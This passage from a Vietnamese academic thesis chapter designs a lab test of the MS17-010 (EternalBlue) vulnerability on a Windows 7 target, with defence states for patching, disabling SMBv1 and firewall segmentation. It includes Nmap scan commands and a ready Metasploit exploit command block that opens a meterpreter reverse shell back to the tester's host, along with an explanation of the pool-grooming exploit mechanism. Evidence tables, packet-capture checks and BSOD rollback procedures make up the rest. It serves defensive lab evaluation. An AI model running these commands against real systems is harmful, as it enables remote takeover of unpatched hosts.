5. **Success Criterion:** Console hiển thị thông báo nhận diện máy mục tiêu tồn tại lỗ hổng: `[+] 192.168.10.20:445 - Host is likely VULNERABLE to MS17-010!`.
6. **Failure Criterion:** Console hiển thị thông báo hệ thống không tồn tại lỗ hổng hoặc đã được vá: `[-] 192.168.10.20:445 - Host does NOT appear vulnerable`.
7. **Output / Evidence:** Dòng log xác nhận của module phụ trợ, dùng để đối chiếu với Nmap NSE. Hai công cụ có thể cùng dựa vào một dấu hiệu nên chưa tạo thành bằng chứng độc lập về trạng thái bản vá.
8. **Inference Boundary:** Củng cố bằng chứng ở Cấp độ 3. Không cấu thành bằng chứng khai thác thành công ở Cấp độ 4.
9. **Limitation:** Phụ thuộc vào tính ổn định của thư viện Ruby SMB client trong framework.
10. **Defense Breakpoint:** Bị bẻ gãy khi cài đặt bản vá KB4012212 ($V = \text{False}$ tại $S_1$) hoặc tắt SMBv1 ($D = \text{False}$ tại $S_2$).

### 2.4.5. Kỹ thuật 5: Xác minh mức độ tác động có kiểm soát bằng Metasploit Exploit Module

1. **Input:** Module `exploit/windows/smb/ms17_010_eternalblue` với cấu hình tham số kiểm soát an toàn:
   ```text
   set RHOSTS 192.168.10.20
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 192.168.20.10
   set LPORT 4444
   set MaxExploitAttempts 1
   exploit
   ```
   Đề tài giới hạn số lần thử theo quy trình lab và dừng để kiểm tra hoặc khôi phục khi có sự cố. Rapid7 ghi nhận module có thể gây mất ổn định, BSOD hoặc khởi động lại trên một số hệ thống [8]. Giới hạn một lần thử không bảo đảm an toàn; không có cơ sở để khẳng định thử lại sẽ gần như chắc chắn gây một mã lỗi cụ thể. Cần đối chiếu tùy chọn của đúng phiên bản module trước khi chạy.

2. **Preconditions:** Toàn bộ chuỗi tiền điều kiện $R \land S \land D \land V = \text{True}$; trạm Pentest mở cổng lắng nghe `4444` sẵn sàng tiếp nhận kết nối ngược; và chính sách Tường lửa cho phép lưu lượng TCP từ máy chủ mục tiêu (`192.168.10.20`) kết nối ngược ra cổng `4444` của trạm Kali (`192.168.20.10`) nhằm kiểm chứng kênh $C$.
3. **Internal Mechanism:** Module thực thi kỹ thuật khai thác qua ba giai đoạn phức tạp:
   - *Giai đoạn 1 (Kích hoạt lỗi FEA):* Gửi các gói tin SMBv1 cấu trúc sai lệch để kích hoạt lỗi chuyển đổi kích thước danh sách FEA trong hàm `SrvOs2FeaListSizeToNt`, tạo điều kiện ghi ngoài biên bộ đệm được cấp phát [8].
   - *Giai đoạn 2 (Bố trí vùng nhớ Non-Paged Pool - Pool Grooming):* Gửi liên tiếp nhiều gói tin tạo kết nối SMB nhằm chiếm các vùng nhớ trống (holes) liền kề nhau trong Non-Paged Pool, định vị đối tượng mục tiêu cần ghi đè ngay sau bộ đệm bị tràn [8].
   - *Giai đoạn 3 (Ghi đè cấu trúc điều khiển và thực thi Shellcode):* Kích hoạt tràn bộ nhớ, ghi đè con trỏ hàm trong cấu trúc điều khiển của driver kernel để chuyển hướng luồng thực thi CPU sang vùng nhớ chứa shellcode. Khi sử dụng payload kết nối ngược, cần kiểm tra bằng chứng thực thi mã và lưu lượng trở về trạm Kali. Tiến trình và quyền thực thi phải được xác nhận từ dữ liệu của lượt chạy; không giả định trước tên tiến trình [7], [8].
4. **Observation Point:** Cửa sổ dòng lệnh Metasploit; danh sách tiến trình trên máy mục tiêu; gói tin TCP kết nối ngược trên Wireshark.
5. **Success Criterion (Chỉ áp dụng để công nhận Cấp độ 4 PASS):**
   - Thiết lập thành công phiên tương tác Meterpreter (`Meterpreter session 1 opened`).
   - Thực thi thành công lệnh kiểm tra quyền hạn trả về chuỗi định danh: `getuid` $\to$ `NT AUTHORITY\SYSTEM`.
   - Thu thập được bằng chứng thực thi lệnh hệ điều hành thành công trong phiên tương tác (ví dụ: `sysinfo`, `ipconfig`).
6. **Failure Criterion (Nhận diện thất bại và phân định lỗi sập hệ thống):**
   - *Trường hợp thất bại an toàn (Safe Fail):* Module thông báo lỗi kết nối, bị từ chối hoặc khai thác không thành công nhưng hệ điều hành mục tiêu vẫn duy trì hoạt động bình thường (`Exploit completed, but no session was created`).
   - *Trường hợp lỗi dừng hệ thống (Kernel Crash / BSOD):* Máy mục tiêu xuất hiện màn hình xanh dừng hệ thống (Bug Check mã `0x00000050` hoặc `0x000000C5`) và tự động khởi động lại, dịch vụ SMB bị gián đoạn. **Trường hợp này không được tính là khai thác thành công (Exploit Success), mà phải được phân loại chính xác là `EXPLOIT_FAILED (KERNEL_INSTABILITY / CRASH)` và cần lưu bằng chứng sự cố; không suy ra riêng nguyên nhân từ việc không có phiên**.
7. **Output / Evidence:** Log phiên làm việc Metasploit; mã định danh tiến trình mục tiêu (`PID`); lưu lượng TCP bắt tay trên cổng 4444 trong tệp pcap.
8. **Inference Boundary:** Bằng chứng lệnh được thực thi với quyền `SYSTEM` xác nhận tác động quan sát được của phiên thử nghiệm ở Cấp độ 4; riêng output của phiên chưa chứng minh quyền kiểm soát toàn bộ nhân hệ điều hành. Không được suy diễn kết quả này áp dụng cho mọi hệ điều hành Windows khác nếu không qua kiểm chứng pool grooming tương ứng.
9. **Limitation:** Tỷ lệ thành công của pool grooming chịu ảnh hưởng bởi mức độ phân mảnh bộ nhớ thực tế tại thời điểm khai thác.
10. **Defense Breakpoint:** Bị bẻ gãy khi cài đặt bản vá KB4012212 ($V = \text{False}$ tại $S_1$), tắt SMBv1 ($D = \text{False}$ tại $S_2$), hoặc chặn tường lửa ($R = \text{False}$ tại $S_3$).

*Bảng 2.3: Bảng đối chiếu các kỹ thuật kiểm thử với các tiền điều kiện và 4 cấp độ trạng thái*

| Kỹ thuật kiểm thử | Công cụ thực thi | Tiền điều kiện kiểm chứng | Cấp độ đối chiếu | Bằng chứng kỹ thuật cốt lõi |
|---|---|:---:|:---:|---|
| **Kỹ thuật 1** | `nmap -sS -sV -p 445` | $R, S$ | **Cấp độ 1** | Gói tin phản hồi `SYN-ACK`, định danh dịch vụ `microsoft-ds` |
| **Kỹ thuật 2** | `nmap --script smb-protocols` | $D$ | **Cấp độ 2** | Phản hồi chấp nhận phương ngữ `NT LM 0.12 (SMBv1)` |
| **Kỹ thuật 3** | `nmap --script smb-vuln-ms17-010` | $V$ | **Cấp độ 3** | Mã lỗi NT Status phản hồi `STATUS_INSUFF_SERVER_RESOURCES` (`0xC0000205`) |
| **Kỹ thuật 4** | `auxiliary/scanner/smb/smb_ms17_010` | $V$ | **Cấp độ 3** | Log kiểm tra chéo từ Metasploit Framework |
| **Kỹ thuật 5** | `exploit/.../ms17_010_eternalblue` | $E, C$ | **Cấp độ 4** | Phiên Meterpreter quyền `SYSTEM` (BSOD bị tính là FAIL) |

Sơ đồ 2.2 mô tả tuần tự luồng kiểm thử nhân quả và sự tương tác giữa các kỹ thuật:

```
[Trạm kiểm thử: Kali Linux]
         |
         |---> (1) Kỹ thuật 1: Kiểm chứng R & S (Cổng 445 mở / microsoft-ds?)
         |     [Không đủ phản hồi: Dừng -> kiểm tra nguyên nhân] ---> Thành công (Cấp độ 1)
         |
         |---> (2) Kỹ thuật 2: Kiểm chứng D (Chấp nhận dialect NT LM 0.12?)
         |     [Không xác định: Dừng -> kiểm tra điều kiện] -----------> Thành công (Cấp độ 2)
         |
         |---> (3) Kỹ thuật 3 & 4: Kiểm chứng V (Mã lỗi NT Status 0xC0000205?)
         |     [Không có dấu hiệu: đối chiếu KB và lỗi] -> Thành công (Cấp độ 3)
         |
         |---> (4) Kỹ thuật 5: Kiểm chứng E & C (Khai thác có kiểm soát)
               |
               +---> Phiên Meterpreter thành công? ===> PASS CẤP ĐỘ 4 (RCE SYSTEM)
               |
               +---> BSOD / Crash / Reboot / Timeout? => Chưa đạt Cấp độ 4; phân loại sự cố
```
*Sơ đồ 2.2: Sơ đồ tuần tự các pha kiểm thử theo mô hình chuỗi nhân quả*

---

## 2.5. MA TRẬN BẰNG CHỨNG ĐA NGUỒN VÀ QUY TRÌNH VẬN HÀNH AN TOÀN

### 2.5.1. Thiết kế Ma trận bằng chứng thu thập đa nguồn (Evidence Matrix)

Nhằm đảm bảo tính minh bạch và khả năng truy vết chặt chẽ của thực nghiệm, mọi dữ liệu kiểm thử tại Chương 3 sẽ được đối chiếu và điền vào Ma trận bằng chứng thiết kế trước tại Bảng 2.4. Trong phạm vi thiết kế phương pháp luận của Chương 2, toàn bộ các ô dữ liệu đo lường thực nghiệm chưa chạy đều được gán nhãn `[CẦN DỮ LIỆU]` theo đúng quy định của đề tài:

*Bảng 2.4: Ma trận bằng chứng thực nghiệm đối chiếu đa nguồn (Evidence Matrix)*

| Snapshot State | Windows Build & Hotfix | Cấu hình SMBv1 | Trạng thái Routing / Firewall | Nmap Raw Output & Reason | Mã phản hồi NSE (NT Status) | Metasploit Console Log | Bằng chứng Wireshark PCAP | Firewall Drop Log Evidence | Kết luận Cấp độ 1–4 |
|:---:|---|---|---|---|---|---|---|---|:---:|
| **$S_0$** | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` |
| **$S_1$** | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` |
| **$S_2$** | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` |
| **$S_3$** | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` | `[CẦN DỮ LIỆU]` |

### 2.5.2. Quy trình kiểm chứng lưu lượng đa điểm (Multi-Point PCAP Verification)

Để chứng minh một biện pháp phòng thủ (đặc biệt là phân đoạn mạng tại trạng thái $S_3$) thực sự bẻ gãy tiền điều kiện tiếp cận mạng ($R = \text{False}$), người kiểm thử không thể chỉ dựa vào thông báo `Host seems down` của Nmap. Thay vào đó, quy trình kiểm chứng lưu lượng mạng đa điểm được thiết lập tại ba vị trí quan sát đồng thời:
1. **Điểm quan sát 1 (Tại trạm Pentest - VLAN 20):** Bắt gói tin trên card `eth0` ghi nhận lệnh Nmap có phát sinh các gói tin TCP SYN gửi tới địa chỉ đích `192.168.10.20` cổng 445.
2. **Điểm quan sát 2 (Tại thiết bị Tường lửa/UTM):** Kiểm tra bảng nhật ký lưu lượng (Firewall Filter Logs). Ghi nhận bản ghi tường lửa kích hoạt quy tắc chặn (Rule Drop/Reject) đối với gói tin TCP từ IP nguồn `192.168.20.10` tới IP đích `192.168.10.20:445`.
3. **Điểm quan sát 3 (Tại máy mục tiêu - VLAN 10):** Bắt gói tin trên card mạng của `Target-Win7`. Kiểm tra xem có gói TCP SYN từ `192.168.20.10` đến trong khoảng thời gian thử hay không. Không thấy gói tin chỉ có ý nghĩa khi đã xác nhận đúng giao diện, bộ lọc và thời điểm bắt gói.

Sự kết hợp đồng thời của ba bằng chứng: (a) Gói tin được gửi đi từ nguồn; (b) Tường lửa ghi nhận hành vi chặn; (c) Gói tin không đến được đích, là tiêu chí dự kiến để đánh giá $R$ trong cấu hình và khoảng thời gian thử. Chưa có tệp bắt gói và log để xác nhận tiêu chí này đã đạt. `[CẦN DỮ LIỆU]`

### 2.5.3. Kế hoạch ứng phó sự cố màn hình xanh (BSOD) và quy trình Rollback

Do hiện tượng phân mảnh pool trong quá trình khai thác kernel luôn tiềm ẩn nguy cơ làm sập hệ điều hành, quy trình quản lý trạng thái và ứng phó sự cố được chuẩn hóa theo Sơ đồ 2.3:

```
+-------------------------------------------------------------+
|               BƯỚC 1: KHỞI TẠO VÀ LƯU SNAPSHOT              |
|        Tạo "Clean Baseline" khi máy ảo ở trạng thái sạch    |
|        (S0_Clean, S1_Clean, S2_Clean, S3_Clean)             |
+------------------------------+------------------------------+
                               |
                               v
+-------------------------------------------------------------+
|               BƯỚC 2: THỰC THI KỊCH BẢN KIỂM THỬ            |
|       Chạy Kỹ thuật 1 -> Kỹ thuật 2 -> Kỹ thuật 3 -> KT 5   |
+------------------------------+------------------------------+
                               |
                               v
               /-------------------------------\
              /    Hệ thống có bị sự cố BSOD?   \
              \      (Crash nhân hệ điều hành)  /
               \-------------------------------/
                       |               |
                  CÓ   |               |   KHÔNG
                       v               v
+------------------------------+  +---------------------------+
| BƯỚC 3A: QUY TRÌNH ROLLBACK  |  | BƯỚC 3B: GHI NHẬN KẾT QUẢ |
| - Dừng tiến trình Metasploit |  | - Thu thập log phiên MSF  |
| - Đánh dấu: Cấp 4 = FAIL     |  | - Dừng bắt gói tệp .pcap  |
| - Khôi phục Snapshot sạch    |  | - Thu thập Firewall log   |
| - Kiểm tra sẵn sàng dịch vụ  |  | - Chuyển pha đối chứng    |
+------------------------------+  +---------------------------+
```
*Sơ đồ 2.3: Quy trình quản lý trạng thái máy ảo và cơ chế khôi phục tức thời qua Snapshot*

Trình tự thực hiện rollback khi phát sinh sự cố:
1. **Ghi nhận sự cố:** Khi lệnh exploit gây màn hình xanh, ghi nhận mã dừng hệ thống (Bug Check Code), thời điểm phát sinh và đánh dấu kết quả thực nghiệm là `FAIL (KERNEL_CRASH)`.
2. **Ngắt kết nối:** Lập tức dừng tiến trình kiểm thử trên máy Kali Linux để giải phóng các socket mạng đang mở.
3. **Thực thi Rollback:** Sử dụng chức năng quản lý snapshot của nền tảng ảo hóa khôi phục máy mục tiêu về trạng thái sạch tương ứng ($S_0, S_1, S_2$ hoặc $S_3$). Cần ghi thời điểm bắt đầu và kết thúc nếu đánh giá thời gian khôi phục. Chưa có số đo để khẳng định thời gian dưới 10 giây hoặc trạng thái bộ nhớ không bị phân mảnh sau khôi phục. `[CẦN DỮ LIỆU]`
4. **Kiểm tra tính sẵn sàng (Pre-flight Check):** Kiểm tra khả năng kết nối, thương lượng SMB và đọc/ghi tệp từ Client tại VLAN 30 trước khi tiếp tục. ICMP Ping hoặc cổng 445 mở riêng lẻ chưa xác nhận dịch vụ chia sẻ tệp đã phục hồi đầy đủ.

---

## TỔNG KẾT CHƯƠNG 2

Chương 2 thiết kế lab ba VLAN và chuỗi bốn trạng thái trên cùng máy mục tiêu để theo dõi quá trình bổ sung biện pháp phòng thủ. Các điều kiện của đường tấn công được gắn với điểm quan sát, tiêu chí đánh giá và dữ liệu cần thu thập. Chuỗi trạng thái giữ tính tích lũy; kết luận về tác dụng riêng của mỗi biện pháp phải dựa vào phép kiểm tra điều kiện tương ứng, không chỉ dựa vào việc phiên thử nghiệm thất bại.

Client tại VLAN 30 được dùng để kiểm tra truy cập hợp lệ sau mỗi cấu hình. Ma trận bằng chứng và quy trình khôi phục giúp tổ chức các lượt kiểm tra dự kiến; chúng chưa chứng minh việc triển khai hoặc thử nghiệm đã thành công. Các kết quả về đọc/ghi tệp, lưu lượng, khả năng thực thi mã và thời gian khôi phục còn `[CẦN DỮ LIỆU]`. Trong phạm vi hiện tại, chương cung cấp thiết kế và tiêu chí kiểm chứng, chưa đưa ra kết quả demo thực tế.


## TÀI LIỆU THAM KHẢO

[1] National Institute of Standards and Technology, Technical Guide to Information Security Testing and Assessment, NIST SP 800-115, 2008. [Online]. Available: https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf.

[2] National Institute of Standards and Technology, Guidelines on Firewalls and Firewall Policy, NIST SP 800-41 Rev. 1, 2009. [Online]. Available: https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-41r1.pdf.

[3] G. Lyon, *Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Vulnerability Scanning*. Sunnyvale, CA: Insecure.Com LLC, 2009.

[4] P. Calderon and Nmap Project, "smb-vuln-ms17-010.nse Script Source Code," Nmap Project, 2017. [Online]. Available: https://svn.nmap.org/nmap/scripts/smb-vuln-ms17-010.nse

[5] Microsoft, "Microsoft Security Bulletin MS17-010 - Critical," Microsoft Learn / Security TechCenter, Mar. 2017. [Online]. Available: https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

[6] Microsoft, "Detect, enable, and disable SMBv1, SMBv2, and SMBv3 in Windows," Microsoft Learn, 2025. [Online]. Available: https://learn.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3

[7] Rapid7, "Metasploit Framework," Metasploit Documentation. [Online]. Available: https://docs.rapid7.com/metasploit/msf-overview/. [Accessed: Oct. 4, 2026].

[8] Rapid7, "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption," Rapid7 Exploit Database, 2017. [Online]. Available: https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
